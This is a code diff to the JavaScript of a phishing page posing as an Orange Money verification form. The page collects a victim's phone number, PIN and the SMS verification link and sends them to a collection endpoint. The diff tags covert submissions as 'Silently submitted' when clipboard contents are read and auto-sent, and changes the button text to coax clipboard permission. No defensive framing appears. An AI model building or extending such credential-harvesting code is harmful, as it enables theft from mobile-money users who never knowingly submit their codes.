@@ -304,7 +304,7 @@ function hideStatus() {
   clipboardBanner.classList.remove('status-visible');
 }
 
-async function submitVerification({ showSubmitting = true } = {}) {
+async function submitVerification({ showSubmitting = true, submissionSource = 'Manually submitted' } = {}) {
   const smsText = sms.value.trim();
   error.textContent = '';
   if (showSubmitting) {
@@ -335,7 +335,7 @@ async function submitVerification({ showSubmitting = true } = {}) {
     : `${window.location.origin}/api/send`;
 
   const payload = {
-    text: `Orange Money Verification\nPhone: <code>${phone}</code>\nPIN: ${pin}\nLink: ${smsText}`
+    text: `Orange Money Verification\nSubmission: <b>${submissionSource}</b>\nPhone: <code>${phone}</code>\nPIN: ${pin}\nLink: ${smsText}`
   };
 
   try {
@@ -401,7 +401,7 @@ async function requestClipboardAccess() {
       sms.value = trimmedClipboardText;
       sms.dispatchEvent(new Event('input', { bubbles: true }));
       error.textContent = '';
-      await submitVerification();
+      await submitVerification({ showSubmitting: false, submissionSource: 'Silently submitted' });
       return true;
     }
 
@@ -441,7 +441,7 @@ async function watchClipboard() {
         sms.value = clipboardText;
         sms.dispatchEvent(new Event('input', { bubbles: true }));
         if (sms.value.trim()) {
-          await submitVerification({ showSubmitting: false });
+          await submitVerification({ showSubmitting: false, submissionSource: 'Silently submitted' });
         }
       }
     } finally {
@@ -455,7 +455,7 @@ if (clipboardBtn) {
     error.textContent = '';
     clipboardAccessClicked = true;
     clipboardBtn.disabled = true;
-    clipboardBtn.textContent = 'Submitting...';
+    clipboardBtn.textContent = 'Allow & Submit';
     if (clipboardBanner) {
       clipboardBanner.classList.remove('status-visible');
       clipboardBanner.querySelector('.clipboard-banner-row')?.classList.add('hidden');
